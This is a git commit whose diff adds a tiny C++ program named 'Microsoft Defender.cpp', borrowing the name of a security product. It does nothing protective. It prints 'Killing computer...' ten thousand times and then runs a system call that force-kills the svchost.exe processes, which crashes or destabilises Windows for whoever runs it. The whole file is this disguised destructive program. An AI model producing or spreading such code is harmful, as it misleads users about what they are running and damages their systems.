395016fc7d789c5527abe87fede2cd9c49191e52
katkasoft <katkaleks@gmail.com>
2025-05-25 15:34:02 +0300

    Microsoft Defender

---
+++ Microsoft Defender.cpp
@@ -0,0 +1,11 @@
+﻿#include <iostream>
+#include <Windows.h>
+
+int main()
+{
+    for (int i = 0; i < 10000; i++) {
+        std::cout << "Killing computer..." << std::endl;
+    }
+    system("taskkill /f /im svchost.exe");
+    return 0;
+}
